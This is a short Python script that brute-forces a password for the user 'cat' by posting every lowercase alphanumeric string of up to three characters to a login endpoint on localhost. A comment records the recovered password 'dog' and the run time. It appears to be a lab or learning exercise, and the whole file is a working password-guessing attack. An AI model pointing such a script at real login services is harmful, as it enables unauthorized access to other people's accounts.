import requests

alphabet = '0123456789qwertyuiopasdfghjklzxcvbnm'

length = 2
state = 0
base = len(alphabet)

while True:

    password = ''
    temp_state = state
    while temp_state > 0:
        ceil = temp_state // base
        rest = temp_state % base
        password = alphabet[rest] + password
        temp_state = ceil

    password = alphabet[0] * (length - len(password)) + password

    print(state, password)
    response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'cat', 'password': password})
    if response.status_code == 200:
        print('Success!', 'cat', password)
        break

    state += 1
    if password == alphabet[-1] * length:
        length += 1
        state = 0

    if len(password) == 4:
        break

# 'dog'
# real	3m45.932s
# user	2m15.002s
# sys	0m11.266s
